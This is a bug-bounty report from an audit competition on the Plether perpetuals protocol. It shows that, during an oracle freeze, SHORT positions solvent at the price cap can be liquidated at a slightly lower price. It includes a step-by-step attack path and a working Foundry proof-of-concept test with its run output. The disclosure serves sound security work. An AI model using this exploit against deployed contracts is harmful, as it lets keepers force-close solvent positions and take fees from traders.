# \#99914 [SC-Medium] Incomplete fix of Cecuro MED-10 (frozen path): during an oracle freeze, liquidations shift the already-capped Engine mark, so SHORTs that are solvent at CAP are liquidated at `CAP - shift`

**Submitted on Nov 15th 2026 at 18:01:15 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99914
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

Cecuro MED-10 was fixed in `eadc5c58` (PR #124) by changing the liquidation price to "shift the raw basket by adverse confidence, then cap". That fix only works when the basket is live. While the oracle is frozen (weekend / market close), the "raw" price fed to the same code is `engine.lastMarkPrice()`, and the Engine already clamped that value to `CAP_PRICE` when it stored it. So in a frozen window the liquidation price for a SHORT is again `CAP - shift`, which is exactly the ordering MED-10 removed. Any keeper can then liquidate a SHORT that `CfdEngineLens.isLiquidatableAt(account, CAP, depth)` reports as solvent.

### Vulnerability Details

The MED-10 fix makes both liquidation entry points shift `rawPrice` first and clamp afterwards:

```solidity
// PletherOracle.sol:539-541  (_updateLiquidationSnapshot)
BasketPrice memory basket = _resolveCurrentBasket(pythUpdateData, PriceMode.Liquidation, policy);
snapshot = _snapshotFromBasket(basket, policy, true);
@> rawPrice = basket.price;

// PletherOracle.sol:342  (updateLiquidationPrice)
@> snapshot.price = _clampToCap(_adverseLiquidationPrice(account, rawPrice, confidence));

// PletherOracle.sol:316-317  (updateLiquidationBatchPrice)
@> shortPrice: _clampToCap(_directionalLiquidationPriceFromShift(CfdTypes.Side.SHORT, rawPrice, shift)),
```

While the oracle is frozen, `basket` does not come from Pyth. It is replayed from the Engine:

```solidity
// PletherOracle.sol:754-755  (_resolveCurrentBasket)
if (policy.oracleFrozen) {
@>  return _frozenBasket(mode, policy.maxStaleness);
}

// PletherOracle.sol:729-743  (_frozenBasket)
@> basket.price = engine.lastMarkPrice();
   basket.publishTime = engine.lastMarkTime();
   ...
   // Liquidations receive a deterministic, conservative confidence shift while Pyth is closed.
@> basket.confidence = basket.price * basketMaxConfidenceRatioBps / 10_000;
```

The Engine mark is stored already capped:

```solidity
// CfdEngine.sol:1475-1476  (updateMarkPrice)
@> uint256 clamped = price > CAP_PRICE ? CAP_PRICE : price;
   _applyCarryAndMark(clamped, publishTime);
```

So if the last live basket before the freeze was at or above CAP, then in frozen mode `rawPrice == CAP` and the SHORT price becomes:

```solidity
// PletherOracle.sol:966-972  (_directionalLiquidationPriceFromShift)
return side == CfdTypes.Side.LONG ? price + shift : price > shift ? price - shift : 0;
//                                                   ^ CAP - shift, then _clampToCap does nothing
```

With the release config (`adverseConfidenceMultiplierBps = 2500`, `basketMaxConfidenceRatioBps = 10`, CAP = 2.0), `shift = 2.0 × 0.1% × 25% = 0.0005`, so SHORTs are liquidated at **1.9995** instead of **2.0**.

Attack path:
1. A trader opens a SHORT of 100,000 at 1.99 with ~5,512 USDG margin.
2. The basket trades at 2.2 (> CAP) until Friday close. `engine.lastMarkPrice() == CAP`.
3. The oracle freezes. `engineLens.isLiquidatableAt(S, CAP, depth) == false`, so the account is solvent at the cap-adjusted mark.
4. Any keeper calls `router.executeLiquidation(S, new bytes[](0))`. The oracle prices the SHORT at 1.9995, the account becomes liquidatable, and it is closed.

### Impact Details

PoC with release risk and oracle params (SHORT 100,000 size, about 200k USDG notional):

| Item | Amount (USDG) |
|---|---|
| Liquidation charge taken from the trader (`bountyBps` 10, `LiquidationAccountingLib.sol:65-78`) | ~199 (99.5 to the keeper, 99.5 to LPs) |
| Price loss `size × shift` | 50 |
| **Total trader loss** | **~249 (~0.125% of notional)** |

- The position is force-closed even though it is solvent at the cap-adjusted mark. The broken invariant is the one MED-10 established: "adverse confidence is applied to the pre-cap basket and the result is capped once".
- Loss scales linearly with position size. It is larger at higher `adverseConfidenceMultiplierBps` / `basketMaxConfidenceRatioBps` values that the code allows.
- The keeper needs only gas and an empty payload. No Pyth data is required during the freeze.
- Preconditions: the basket closed the week at or above CAP, and the account's equity is within `size × shift` (50 USDG here) of the frozen maintenance requirement.

### Mitigation

Store the pre-cap neutral basket next to the capped mark (for example `lastRawMarkPrice` in the Engine or the oracle) and use it as `basket.price` in `_frozenBasket` for `PriceMode.Liquidation`. Alternatively, in frozen liquidation mode, when `engine.lastMarkPrice() == CAP_PRICE`, return `CAP_PRICE` as the SHORT price.

### References

- `packages/perps/src/PletherOracle.sol:308-323`: `updateLiquidationBatchPrice` (shift then clamp, `:316-317`)
- `packages/perps/src/PletherOracle.sol:334-344`: `updateLiquidationPrice` (shift then clamp, `:342`)
- `packages/perps/src/PletherOracle.sol:532-542`: `_updateLiquidationSnapshot` (`rawPrice = basket.price`, `:541`)
- `packages/perps/src/PletherOracle.sol:729-743`: `_frozenBasket` (uses capped `engine.lastMarkPrice()`)
- `packages/perps/src/PletherOracle.sol:754-755`: frozen branch of `_resolveCurrentBasket`
- `packages/perps/src/PletherOracle.sol:966-972`: `_directionalLiquidationPriceFromShift`
- `packages/perps/src/CfdEngine.sol:1475`: Engine mark clamped to `CAP_PRICE` before storage
- Cecuro MED-10, fix commit `eadc5c58` (PR #124)


## Proof of Concept

## Proof of Concept


Save as `packages/perps/test/audit-fuzz/camp96-cecuro-fixes/FrozenLiqCapOrdering.t.sol` (it uses the repo's own `BasePerpTest`; only Pyth and USDG are mocked) and run:

```
forge test --root packages/perps --match-path test/audit-fuzz/camp96-cecuro-fixes/FrozenLiqCapOrdering.t.sol --gas-limit 100000000000 -vv
```

The test bisects the opening margin to find a SHORT that is solvent at CAP but liquidatable at `CAP - shift` during the freeze, then liquidates it with an empty payload. The final assertion `_size(S) == 0` is the proof.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice camp96: Cecuro MED-10 sibling check, live vs frozen liquidation.
///         The MED-10 fix (eadc5c58) shifts the RAW basket and clamps afterwards, but only for live baskets.
///         In a frozen window `_frozenBasket` replays the Engine mark, which is already CAP-clamped
///         (PletherOracle.sol:729-743, 754-755), and `_adverseLiquidationPrice` shifts that capped value
///         (PletherOracle.sol:943-972). A SHORT whose last live raw basket was above CAP is therefore
///         liquidated at CAP - shift during the freeze.
contract Camp96FrozenLiqCapOrderingTest is BasePerpTest {

    address internal constant S = address(0x5404);
    uint256 internal constant ADVERSE_MULT = 2500;
    uint256 internal constant CONF_RATIO = 10;
    uint256 internal constant SIZE = 100_000e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.adverseConfidenceMultiplierBps = ADVERSE_MULT;
        cfg.basketMaxConfidenceRatioBps = CONF_RATIO;
        _setRouterConfig(cfg);
        _fundTrader(S, 200_000e6);
        _refresh(1.99e8, 0);
    }

    function _payload(
        uint256 price,
        uint256 conf,
        uint256 publishTime,
        uint256 prev
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), uint64(conf), -8, publishTime, prev)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refresh(
        uint256 price,
        uint256 conf
    ) internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 t = vm.getBlockTimestamp();
        router.updateMarkPrice(_payload(price, conf, t, t - 1));
    }

    function _commitExecute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal returns (uint64 id) {
        vm.prank(account);
        id = router.commitOrder(side, size, margin, 0, isClose);
        uint256 commitTime = vm.getBlockTimestamp();
        vm.warp(commitTime + 1);
        vm.roll(vm.getBlockNumber() + 1);
        router.executeOrder(id, _payload(price, 0, commitTime + 1, commitTime));
    }

    function _size(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    /// @dev Last live mark is at raw 2.2 (> CAP 2.0) so the cached Engine mark is CAP. Then warp, refreshing at the
    ///      same raw price, into the first frozen second.
    function _toFrozenAtRawAboveCap(
        uint256 raw
    ) internal {
        uint256 guard;
        while (!engine.isOracleFrozen()) {
            _refresh(raw, 0);
            vm.warp(vm.getBlockTimestamp() + 30 minutes);
            vm.roll(vm.getBlockNumber() + 1);
            require(++guard < 2000, "no freeze");
        }
    }

    // liqAtCap: lens predicate at CAP (MED-10 rule when raw - shift >= CAP); liqAtShifted: at CAP - frozen shift.
    function _probe(
        uint256 margin
    ) internal returns (bool opened, bool liqAtCap, bool liqAtShifted, uint256 shift) {
        try this.extOpen(margin) {
            opened = _size(S) == SIZE;
        } catch {
            return (false, false, false, 0);
        }
        if (!opened) return (false, false, false, 0);
        _toFrozenAtRawAboveCap(2.2e8);
        uint256 cap = engine.CAP_PRICE();
        assertEq(engine.lastMarkPrice(), cap, "cached mark is CAP");
        uint256 frozenConf = cap * CONF_RATIO / 10_000;
        shift = frozenConf * ADVERSE_MULT / 10_000;
        uint256 depth = pool.totalAssets();
        liqAtCap = engineLens.isLiquidatableAt(S, cap, depth);
        liqAtShifted = engineLens.isLiquidatableAt(S, cap - shift, depth);
    }

    function extOpen(
        uint256 margin
    ) external {
        require(msg.sender == address(this));
        _commitExecute(S, CfdTypes.Side.SHORT, SIZE, margin, false, 1.99e8);
    }

    function test_FrozenShortLiquidation_UsesCapMinusShift() public {
        uint256 lo = 500e6; // assume liquidatable-at-shifted side (too little margin)
        uint256 hi = 30_000e6; // safe side
        bool foundWindow;
        uint256 windowMargin;
        uint256 shiftSeen;
        for (uint256 i; i < 28 && hi - lo > 1; ++i) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            (bool opened, bool liqCap, bool liqShift, uint256 sh) = _probe(mid);
            vm.revertToState(snap);
            if (!opened) {
                lo = mid;
                continue;
            }
            shiftSeen = sh;
            if (!liqCap && liqShift) {
                foundWindow = true;
                windowMargin = mid;
                break;
            }
            if (liqCap) lo = mid;
            else hi = mid;
        }
        console2.log("frozen shift (1e8)", shiftSeen);
        console2.log("window found", foundWindow);
        console2.log("margin in window (USDG 6dp)", windowMargin);
        assertTrue(foundWindow, "no margin where account is solvent at CAP but liquidatable at CAP - shift");

        // Replay at the window margin and let any keeper liquidate during the freeze.
        (bool opened2, bool liqCap2, bool liqShift2,) = _probe(windowMargin);
        assertTrue(opened2 && !liqCap2 && liqShift2, "replay");
        uint256 balBefore = _settlementBalance(S);
        address keeper = address(0xBEEF);
        uint256 keeperBefore = _settlementBalance(keeper);
        uint256 poolBefore = pool.totalAssets();
        vm.deal(keeper, 1 ether);
        vm.prank(keeper);
        router.executeLiquidation(S, new bytes[](0));
        uint256 balAfter = _settlementBalance(S);
        console2.log("trader settlement before liq", balBefore);
        console2.log("trader settlement after liq ", balAfter);
        console2.log("keeper bounty (USDG 6dp)    ", _settlementBalance(keeper) - keeperBefore);
        console2.log("pool assets delta (signed)  ", int256(pool.totalAssets()) - int256(poolBefore));
        console2.log("size * shift (USDG 6dp)     ", SIZE * 50_000 / 1e8 / 1e12);
        // The position is gone even though it is solvent at the cap-adjusted mark (CAP).
        assertEq(_size(S), 0, "SHORT liquidated during freeze while solvent at CAP");
    }

}
```

Result (actually run, `forge test --root packages/perps --match-path test/audit-fuzz/camp96-cecuro-fixes/FrozenLiqCapOrdering.t.sol --gas-limit 100000000000 -vv`, commit `a82d4fef`):

```
Ran 1 test for test/audit-fuzz/camp96-cecuro-fixes/FrozenLiqCapOrdering.t.sol:Camp96FrozenLiqCapOrderingTest
[PASS] test_FrozenShortLiquidation_UsesCapMinusShift() (gas: 97559121)
Logs:
  frozen shift (1e8) 50000
  window found true
  margin in window (USDG 6dp) 5512695312
  trader settlement before liq 199722590220
  trader settlement after liq  200473590220
  keeper bounty (USDG 6dp)     99500000
  pool assets delta (signed)   -850500000
  size * shift (USDG 6dp)      50000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

